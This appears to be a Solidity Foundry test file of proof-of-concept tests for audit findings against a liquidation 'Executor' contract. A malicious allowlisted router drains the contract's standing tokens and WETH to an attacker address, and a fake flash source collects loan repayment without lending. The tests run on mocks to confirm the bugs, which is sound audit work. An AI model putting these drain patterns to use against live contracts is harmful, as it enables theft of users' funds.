// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Executor} from "../../src/Executor.sol";
import {PlanBuilder as PB} from "../unit/PlanBuilder.sol";
import {ExecutorTestBase} from "../unit/Base.sol";
import {MockERC20} from "../unit/Mocks.sol";

/**
 * INV-09 / INV-10 are KNOWN BROKEN (C-01 / C-02 / DRAFT-01 / DRAFT-02).
 *
 * This file does NOT weaken the invariant statements. It:
 *  1. States the correct property as documentation.
 *  2. Provides deterministic + fuzzed demonstrations that the property is violated.
 *  3. Leaves a `invariant_INV09_*` / `invariant_INV10_*` in a separate contract
 *     that is expected to FAIL when the adversarial handler is targeted
 *     (run with --match-contract ExecutorKnownBrokenInvariant — expect FAIL).
 *
 * Green CI should match ExecutorFocusInvariant / ExecutorEdgeFuzz / *PoC, not
 * ExecutorKnownBrokenInvariant.
 */

/// Malicious allowlisted router: pulls approved tokens to an attacker.
contract KnownFailDrainRouter {
    function steal(address token, address to, uint256 amount) external {
        require(MockERC20(token).transferFrom(msg.sender, to, amount), "drain");
    }
}

interface IUniV3FlashCb {
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external;
}

/// Plan-controlled flashSource that never lends; still receives the repay transfer.
contract KnownFailFakeFlash {
    function flash(address recipient, uint256, uint256, bytes calldata data) external {
        IUniV3FlashCb(recipient).uniswapV3FlashCallback(0, 0, data);
    }

    function token0() external pure returns (address) {
        return address(0);
    }
}

/*
 * Correct property (INV-09): Non-WETH standing cannot leave except sweep → PROFIT_SINK.
 * Reality: S_ROUTER + L_TAKE_BALANCE drains standing ERC-20 to arbitrary recipient.
 */
contract ExecutorKnownFailINV09 is ExecutorTestBase {
    KnownFailDrainRouter internal drainRouter;
    address internal attacker = makeAddr("kf-attacker");

    function setUp() public override {
        super.setUp();
        drainRouter = new KnownFailDrainRouter();
        ex = new Executor(
            operator,
            sink,
            address(factory),
            factory.initHash(),
            address(drainRouter),
            address(routerB),
            address(weth),
            v2Factory,
            V2_HASH,
            sushiFactory,
            SUSHI_HASH,
            address(curveRegistry)
        );
        pool.setPosition(borrower, 0.95e18, REPAY, COLL_OUT);
    }

    /// Property statement (what SHOULD hold): after execute, non-WETH leaving the
    /// executor must equal increase at PROFIT_SINK only. This test documents the
    /// VIOLATION — it PASSES when the drain succeeds (bug confirmed).
    function test_knownfail_INV09_standing_non_weth_leaves_not_via_sink() public {
        uint256 standing = 1_000e6;
        debt.mint(address(ex), standing);

        bytes memory stealLeg = PB.routerSwap(
            address(drainRouter),
            address(debt),
            address(debt),
            PB.L_TAKE_BALANCE,
            0,
            abi.encodeCall(KnownFailDrainRouter.steal, (address(debt), attacker, standing))
        );
        bytes memory profitLeg =
            PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0);
        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(2, bytes.concat(stealLeg, profitLeg))
        );

        uint256 sinkBefore = debt.balanceOf(sink);
        _exec(plan);

        // INV-09 VIOLATED: standing left executor, sink did not receive it.
        assertEq(debt.balanceOf(attacker), standing, "INV-09 broken: attacker got standing");
        assertEq(debt.balanceOf(sink), sinkBefore, "INV-09 broken: sink unchanged (not sweep path)");
        assertEq(debt.balanceOf(address(ex)), 0, "executor drained");
    }

    /// Fuzzed demonstration: any positive standing amount is drainable.
    function testFuzz_knownfail_INV09_any_standing_drainable(uint256 standingSeed) public {
        uint256 standing = bound(standingSeed, 1e6, 5_000_000e6);
        debt.mint(address(ex), standing);

        bytes memory stealLeg = PB.routerSwap(
            address(drainRouter),
            address(debt),
            address(debt),
            PB.L_TAKE_BALANCE,
            0,
            abi.encodeCall(KnownFailDrainRouter.steal, (address(debt), attacker, standing))
        );
        bytes memory profitLeg =
            PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0);
        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(2, bytes.concat(stealLeg, profitLeg))
        );

        _exec(plan);
        assertEq(debt.balanceOf(attacker), standing, "INV-09: standing always drainable");
    }
}

/*
 * Correct property (INV-10): Flash repay paid only to a real lender.
 * Reality: plan.flashSource is armed without CREATE2; fake source receives repay.
 */
contract ExecutorKnownFailINV10 is ExecutorTestBase {
    KnownFailFakeFlash internal fake;

    function setUp() public override {
        super.setUp();
        fake = new KnownFailFakeFlash();
    }

    function test_knownfail_INV10_repay_paid_to_fake_flashSource() public {
        debt.mint(address(ex), REPAY);

        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_UNIV3, address(fake), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(1, _profitLeg())
        );

        uint256 fakeBefore = debt.balanceOf(address(fake));
        _exec(plan);
        uint256 stolen = debt.balanceOf(address(fake)) - fakeBefore;

        assertEq(stolen, REPAY, "INV-10 broken: fake received full repay without lending");
    }

    function testFuzz_knownfail_INV10_fake_receives_flash_amount(uint256 flashSeed) public {
        uint128 flashAmt = uint128(bound(flashSeed, 1e6, REPAY));
        // Scale position to flashAmt so liquidation can use standing funds.
        uint128 collOut = uint128(uint256(flashAmt) * uint256(COLL_OUT) / uint256(REPAY));
        if (collOut == 0) collOut = 1;
        uint128 owed = flashAmt; // fake fees = 0; repay swap still buys OWED-scale via exact size
        // Fund standing for liquidation + fake repay (no real flash credit).
        debt.mint(address(ex), flashAmt);
        // Repay swap needs enough COLL→DEBT to cover flashAmt (fee0+fee1=0).
        uint128 spent = uint128((uint256(flashAmt) * 1e8 + 60_000e6 - 1) / 60_000e6);
        if (spent >= collOut) {
            collOut = spent + uint128(uint256(spent) / 10 + 1);
        }
        pool.setPosition(borrower, 0.9e18, flashAmt, collOut);

        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_UNIV3, address(fake), address(debt), flashAmt, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), flashAmt),
            PB.poolSwap(address(pCollDebt), address(coll), address(debt), PB.L_EXACT_OUT, flashAmt),
            PB.profit(1, PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0))
        );

        uint256 fakeBefore = debt.balanceOf(address(fake));
        _exec(plan);
        assertEq(
            debt.balanceOf(address(fake)) - fakeBefore,
            flashAmt,
            "INV-10: fake always receives flashAmount"
        );
        // silence unused
        owed;
    }
}

/*
 * INV-08 gap: NatSpec claims standing WETH cannot be touched because gross underflows
 * if balance falls. Enforcement is only `wethAfter >= wethBefore`. When stolen standing
 * is <= realized profit in the same tx, standing WETH leaves to an arbitrary recipient
 * and execute still succeeds.
 */
contract ExecutorKnownFailINV08Gap is ExecutorTestBase {
    KnownFailDrainRouter internal drainRouter;
    address internal attacker = makeAddr("inv08-gap-attacker");

    function setUp() public override {
        super.setUp();
        drainRouter = new KnownFailDrainRouter();
        ex = new Executor(
            operator,
            sink,
            address(factory),
            factory.initHash(),
            address(drainRouter),
            address(routerB),
            address(weth),
            v2Factory,
            V2_HASH,
            sushiFactory,
            SUSHI_HASH,
            address(curveRegistry)
        );
        pool.setPosition(borrower, 0.95e18, REPAY, COLL_OUT);
    }

    function test_knownfail_INV08_small_standing_weth_stealable() public {
        // Standing below reference gross (~0.995e18) — steal is masked by profit.
        uint256 standing = 0.5e18;
        weth.mint(address(ex), standing);

        bytes memory stealLeg = PB.routerSwap(
            address(drainRouter),
            address(weth),
            address(weth),
            PB.L_TAKE_BALANCE,
            0,
            abi.encodeCall(KnownFailDrainRouter.steal, (address(weth), attacker, standing))
        );
        bytes memory profitLeg =
            PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0);
        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(2, bytes.concat(stealLeg, profitLeg))
        );

        uint256 before = weth.balanceOf(address(ex));
        _exec(plan);

        assertEq(weth.balanceOf(attacker), standing, "INV-08 gap: attacker got standing WETH");
        assertGe(weth.balanceOf(address(ex)), before - standing, "gross still non-underflow");
        assertGt(weth.balanceOf(address(ex)), 0, "liq profit remains on executor");
    }

    function testFuzz_knownfail_INV08_standing_below_profit_stealable(uint256 standingSeed) public {
        uint256 standing = bound(standingSeed, 1, uint256(GROSS_WETH) - 1);
        weth.mint(address(ex), standing);

        bytes memory stealLeg = PB.routerSwap(
            address(drainRouter),
            address(weth),
            address(weth),
            PB.L_TAKE_BALANCE,
            0,
            abi.encodeCall(KnownFailDrainRouter.steal, (address(weth), attacker, standing))
        );
        bytes memory profitLeg =
            PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0);
        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(2, bytes.concat(stealLeg, profitLeg))
        );

        _exec(plan);
        assertEq(weth.balanceOf(attacker), standing, "INV-08 gap: any sub-profit standing drainable");
    }
}

/**
 * Adversarial handler that INCLUDES the INV-09 drain path.
 * Targeting this contract with invariant_INV09_* is expected to FAIL —
 * that failure is the proof, not a test to "fix."
 *
 * Run: forge test --match-contract ExecutorKnownBrokenInvariant -vvv
 * Expect: [FAIL] invariant_INV09_non_weth_only_leaves_via_sink
 */
contract BrokenINV09Handler is ExecutorTestBase {
    KnownFailDrainRouter public drainRouter;
    address public attacker = makeAddr("broken-attacker");
    uint256 public ghost_drains;

    MockERC20 public standingToken; // alias to debt after init

    function setUp() public override {}

    function init() external {
        super.setUp();
        drainRouter = new KnownFailDrainRouter();
        ex = new Executor(
            operator,
            sink,
            address(factory),
            factory.initHash(),
            address(drainRouter),
            address(routerB),
            address(weth),
            v2Factory,
            V2_HASH,
            sushiFactory,
            SUSHI_HASH,
            address(curveRegistry)
        );
        pool.setPosition(borrower, 0.95e18, REPAY, COLL_OUT);
        standingToken = debt;
        // Seed standing so first drain can fire.
        debt.mint(address(ex), 500e6);
    }

    /// Adversarial action: drain whatever non-WETH standing exists.
    function drainStandingNonWeth() external {
        uint256 standing = debt.balanceOf(address(ex));
        if (standing == 0) {
            debt.mint(address(ex), 100e6);
            standing = 100e6;
        }
        bytes memory stealLeg = PB.routerSwap(
            address(drainRouter),
            address(debt),
            address(debt),
            PB.L_TAKE_BALANCE,
            0,
            abi.encodeCall(KnownFailDrainRouter.steal, (address(debt), attacker, standing))
        );
        bytes memory profitLeg =
            PB.poolSwap(address(pCollWeth), address(coll), address(weth), PB.L_TAKE_BALANCE, 0);
        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_AAVE, address(pool), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(2, bytes.concat(stealLeg, profitLeg))
        );
        // Reset borrower HF for repeated drains.
        pool.setPosition(borrower, 0.95e18, REPAY, COLL_OUT);
        vm.prank(operator);
        try ex.execute(plan) {
            ghost_drains++;
        } catch {
            // ignore
        }
    }
}

contract ExecutorKnownBrokenInvariant is ExecutorTestBase {
    BrokenINV09Handler internal h;

    function setUp() public override {
        h = new BrokenINV09Handler();
        h.init();
        targetContract(address(h));
        bytes4[] memory sel = new bytes4[](1);
        sel[0] = BrokenINV09Handler.drainStandingNonWeth.selector;
        targetSelector(FuzzSelector({addr: address(h), selectors: sel}));
    }

    /// CORRECT INV-09 statement — MUST FAIL when drainStandingNonWeth is called.
    /// Do not "fix" this by excluding the drain selector.
    function invariant_INV09_non_weth_only_leaves_via_sink() public view {
        // Any non-WETH that left the executor must have arrived at PROFIT_SINK.
        // Attacker balance > 0 means standing left via router, not sweep.
        assertEq(
            h.debt().balanceOf(h.attacker()),
            0,
            "INV-09: non-WETH left executor to non-sink address"
        );
    }
}
